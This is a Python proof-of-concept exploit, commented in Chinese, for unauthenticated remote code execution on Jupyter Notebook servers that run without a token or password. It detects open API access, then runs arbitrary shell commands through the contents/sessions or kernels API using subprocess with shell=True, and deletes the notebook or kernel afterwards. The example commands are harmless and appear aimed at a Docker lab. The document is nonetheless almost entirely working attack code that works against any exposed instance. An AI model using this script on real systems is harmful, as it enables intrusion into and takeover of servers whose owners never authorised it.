#!/usr/bin/env python3
"""
Jupyter Notebook 未授权访问远程代码执行漏洞 POC
漏洞: notebook-rce (无CVE编号)
漏洞等级: 严重

==================== 漏洞描述 ====================
【漏洞原理】
Jupyter Notebook 在未配置密码或token时，存在未授权访问漏洞。
攻击者可直接访问Jupyter Web界面，创建终端或代码执行环境，
在服务器上执行任意Python代码和系统命令。

【影响范围】
- Jupyter Notebook (未配置 --NotebookApp.token 或 --NotebookApp.password)
- 端口: 8888

【危害等级】
- 无需认证
- 可执行任意Python代码和系统命令

==================== 环境要求 ====================
- Python 3.6+
- requests库

==================== 验证步骤 ====================
1. 基础检测:
   python jupyter_notebook_rce.py http://target:8888 --check-only

2. 执行命令:
   python jupyter_notebook_rce.py http://target:8888 -c "id > /tmp/out"
   python jupyter_notebook_rce.py http://target:8888 -c "touch /tmp/success"

==================== 预期结果 ====================
- 命令在Jupyter服务器执行
- 验证: docker compose exec web ls -la /tmp/success
"""

import sys
import json
import time
import uuid
import argparse
import requests
from typing import Dict, Optional
from urllib.parse import urljoin


class JupyterNotebookRCEPOC:
    """Jupyter Notebook 未授权访问 RCE POC"""

    VULN_NAME = "Jupyter Notebook Unauthorized RCE"
    CVE_ID = "N/A"
    SEVERITY = "严重"
    AFFECTED = "Jupyter Notebook (未配置认证)"

    def __init__(self, target: str, timeout: int = 15, proxy: str = None,
                 verify_ssl: bool = False):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.proxy = proxy
        self.verify_ssl = verify_ssl

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = self.verify_ssl
        if self.proxy:
            session.proxies = {"http": self.proxy, "https": self.proxy}
        session.headers.update({"User-Agent": "Mozilla/5.0"})
        if not self.verify_ssl:
            requests.packages.urllib3.disable_warnings()
        return session

    def check(self) -> Dict:
        """检测Jupyter Notebook是否可未授权访问"""
        result = {
            "vulnerability": f"{self.VULN_NAME} ({self.CVE_ID})",
            "target": self.target,
            "status": "unknown",
            "details": [],
            "conclusion": ""
        }
        session = self._create_session()

        print("[*] 步骤1/3: 检测Jupyter服务...")
        try:
            resp = session.get(self.target, timeout=self.timeout)
            html_lower = resp.text.lower()
            is_jupyter = "jupyter" in html_lower
            print(f"[*] HTTP {resp.status_code}, Jupyter: {is_jupyter}")
            result["details"].append(f"HTTP {resp.status_code}")
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"服务不可达: {e}"
            return result

        print("[*] 步骤2/3: 检测是否需要认证...")
        no_auth = True
        # 检查登录页面特征
        if "token" in resp.text or "password" in resp.text:
            if "signin" in resp.text.lower() or "login" in resp.text.lower():
                no_auth = False

        # 检查/api/contents是否可访问
        api_url = urljoin(self.target, "/api/contents")
        try:
            api_resp = session.get(api_url, timeout=self.timeout)
            if api_resp.status_code == 200:
                no_auth = True
                result["details"].append("API无认证限制")
            elif api_resp.status_code == 403:
                no_auth = False
        except Exception:
            pass

        if no_auth:
            print("[+] 未授权访问!")
            result["status"] = "vulnerable"
            result["details"].append("无需认证即可访问")
            result["conclusion"] = (
                "Jupyter Notebook无需认证。\n"
                "尝试执行命令: python jupyter_notebook_rce.py "
                f"{self.target} -c \"id > /tmp/out\""
            )
        else:
            print("[-] 需要认证")
            result["status"] = "not_vulnerable"
            result["conclusion"] = "Jupyter需要token或密码认证"

        print("[*] 步骤3/3: 检测API端点...")
        for ep in ["/api/terminals", "/api/kernels", "/api/contents"]:
            try:
                r = session.get(urljoin(self.target, ep), timeout=self.timeout)
                if r.status_code != 404:
                    result["details"].append(f"API: {ep} (HTTP {r.status_code})")
            except Exception:
                pass

        return result

    def exploit(self, command: str = "id") -> Dict:
        """
        利用Jupyter API执行系统命令

        步骤1: 检查API可用性
        步骤2: 创建notebook并执行代码
        步骤3: 读取执行结果
        """
        result = {
            "vulnerability": f"{self.VULN_NAME} ({self.CVE_ID})",
            "target": self.target,
            "command": command,
            "status": "unknown",
            "details": [],
            "output": "",
            "conclusion": ""
        }
        session = self._create_session()

        # 检查认证
        api_url = urljoin(self.target, "/api/contents")
        try:
            r = session.get(api_url, timeout=self.timeout)
            if r.status_code == 403:
                result["status"] = "failed"
                result["conclusion"] = "需要认证"
                return result
            print(f"[*] API访问: HTTP {r.status_code}")
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"API不可达: {e}"
            return result

        # 步骤1: 创建notebook
        print("[*] 步骤1/4: 创建notebook...")
        nb_name = f"exec_{uuid.uuid4().hex[:8]}"
        nb_url = urljoin(self.target, f"/api/contents/{nb_name}.ipynb")
        nb_payload = {
            "type": "notebook",
            "content": {
                "cells": [
                    {
                        "cell_type": "code",
                        "metadata": {},
                        "source": [f"import subprocess; subprocess.run('{command}', shell=True)\n"],
                        "outputs": []
                    }
                ],
                "metadata": {
                    "kernelspec": {
                        "display_name": "Python 3",
                        "language": "python",
                        "name": "python3"
                    },
                    "language_info": {"name": "python", "version": "3.6.0"}
                },
                "nbformat": 4,
                "nbformat_minor": 2
            }
        }
        try:
            resp = session.put(nb_url, json=nb_payload, timeout=self.timeout)
            result["details"].append(f"创建notebook: HTTP {resp.status_code}")
            print(f"[*] 创建notebook: HTTP {resp.status_code}")
            if resp.status_code not in (200, 201):
                # 尝试另一种方式: 直接使用kernel API
                print("[*] notebook创建失败, 尝试kernel API...")
                return self._exploit_via_kernel(session, result, command)
        except Exception as e:
            return self._exploit_via_kernel(session, result, command)

        # 步骤2: 创建session并关联kernel
        print("[*] 步骤2/4: 启动kernel...")
        session_url = urljoin(self.target, "/api/sessions")
        session_payload = {
            "kernel": {"name": "python3"},
            "notebook": {"path": f"{nb_name}.ipynb"}
        }
        try:
            resp = session.post(session_url, json=session_payload, timeout=self.timeout)
            result["details"].append(f"创建session: HTTP {resp.status_code}")
            print(f"[*] 创建session: HTTP {resp.status_code}")
            if resp.status_code not in (200, 201):
                result["status"] = "failed"
                result["conclusion"] = "无法创建kernel session"
                return result
            session_data = resp.json()
            kernel_id = session_data.get("kernel", {}).get("id", "")
            result["kernel_id"] = kernel_id
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"session异常: {e}"
            return result

        # 步骤3: 触发执行
        print("[*] 步骤3/4: 触发代码执行...")
        execute_url = urljoin(self.target, f"/api/kernels/{kernel_id}/execute")
        execute_payload = {
            "code": f"import subprocess; subprocess.run('{command}', shell=True)",
            "silent": False,
            "store_history": True
        }
        try:
            resp = session.post(execute_url, json=execute_payload, timeout=self.timeout)
            result["details"].append(f"执行: HTTP {resp.status_code}")
            print(f"[*] 执行: HTTP {resp.status_code}")
        except Exception as e:
            print(f"[*] 执行异常: {e}")

        # 等待执行完成
        time.sleep(2)

        # 步骤4: 清理notebook
        print("[*] 步骤4/4: 清理...")
        try:
            session.delete(nb_url, timeout=self.timeout)
        except Exception:
            pass

        result["status"] = "suspected_exploited"
        result["conclusion"] = (
            "代码已提交执行。\n"
            "验证命令执行:\n"
            f"  docker compose exec web ls -la /tmp/success\n"
            "  docker compose exec web cat /tmp/out"
        )

        return result

    def _exploit_via_kernel(self, session: requests.Session,
                            result: Dict, command: str) -> Dict:
        """备用方案: 直接通过kernel API执行"""
        print("[*] 备用方案: 直接启动kernel执行...")

        kernel_url = urljoin(self.target, "/api/kernels")
        try:
            resp = session.post(kernel_url, json={"name": "python3"},
                                timeout=self.timeout)
            result["details"].append(f"启动kernel: HTTP {resp.status_code}")
            if resp.status_code not in (200, 201):
                result["status"] = "failed"
                result["conclusion"] = "无法启动kernel"
                return result
            kernel_id = resp.json().get("id", "")
            result["kernel_id"] = kernel_id
            print(f"[+] Kernel: {kernel_id}")
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"kernel异常: {e}"
            return result

        execute_url = urljoin(self.target, f"/api/kernels/{kernel_id}/execute")
        execute_payload = {"code": f"import subprocess; subprocess.run('{command}', shell=True)",
                           "silent": False, "store_history": True}
        try:
            resp = session.post(execute_url, json=execute_payload, timeout=self.timeout)
            result["details"].append(f"执行: HTTP {resp.status_code}")
        except Exception as e:
            pass

        time.sleep(2)

        # 清理kernel
        try:
            session.delete(urljoin(self.target, f"/api/kernels/{kernel_id}"),
                           timeout=self.timeout)
        except Exception:
            pass

        result["status"] = "suspected_exploited"
        result["conclusion"] = (
            "代码已通过kernel API执行。\n"
            "验证: docker compose exec web ls -la /tmp/success"
        )
        return result

    def run(self, command: str = "") -> Dict:
        print(f"[*] {self.VULN_NAME} ({self.CVE_ID}) - 开始验证")
        print(f"[*] 目标: {self.target}")
        print(f"[*] 严重等级: {self.SEVERITY}")
        print("-" * 60)
        if command:
            return self.exploit(command)
        return self.check()

    def print_result(self, result: Dict):
        status = result.get("status", "unknown")
        icons = {"exploited": "[+]", "vulnerable": "[+]",
                 "suspected_exploited": "[?]",
                 "failed": "[-]", "not_vulnerable": "[-]", "error": "[!]"}
        icon = icons.get(status, "[-]")
        print(f"\n{'=' * 60}")
        print(f"{icon} 漏洞: {result['vulnerability']}")
        print(f"    目标: {result['target']}")
        print(f"    状态: {status}")
        if result.get("command"):
            print(f"    命令: {result['command']}")
        if result.get("kernel_id"):
            print(f"    Kernel: {result['kernel_id']}")
        for d in result.get("details", []):
            print(f"    {d}")
        print(f"    结论: {result.get('conclusion', '')}")
        print(f"{'=' * 60}")


def main():
    parser = argparse.ArgumentParser(
        description="Jupyter Notebook 未授权访问RCE POC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  python jupyter_notebook_rce.py http://target:8888 --check-only
  python jupyter_notebook_rce.py http://target:8888 -c "touch /tmp/success"
  python jupyter_notebook_rce.py http://target:8888 -c "id > /tmp/out"

原理: Jupyter Notebook未配置token时, API无需认证即可执行代码
        """
    )
    parser.add_argument("target", help="目标URL (e.g., http://192.168.1.100:8888)")
    parser.add_argument("--check-only", action="store_true", help="仅检测不利用")
    parser.add_argument("-c", "--command", default="", help="要执行的命令")
    parser.add_argument("-t", "--timeout", type=int, default=15, help="请求超时(秒)")
    parser.add_argument("--proxy", help="HTTP代理")
    parser.add_argument("-k", "--insecure", action="store_true", help="跳过SSL验证")
    parser.add_argument("--output", choices=["text", "json"], default="text")
    args = parser.parse_args()

    poc = JupyterNotebookRCEPOC(
        target=args.target, timeout=args.timeout,
        proxy=args.proxy, verify_ssl=not args.insecure
    )

    if args.check_only:
        result = poc.check()
    elif args.command:
        result = poc.run(args.command)
    else:
        result = poc.check()

    if args.output == "json":
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        poc.print_result(result)


if __name__ == "__main__":
    main()
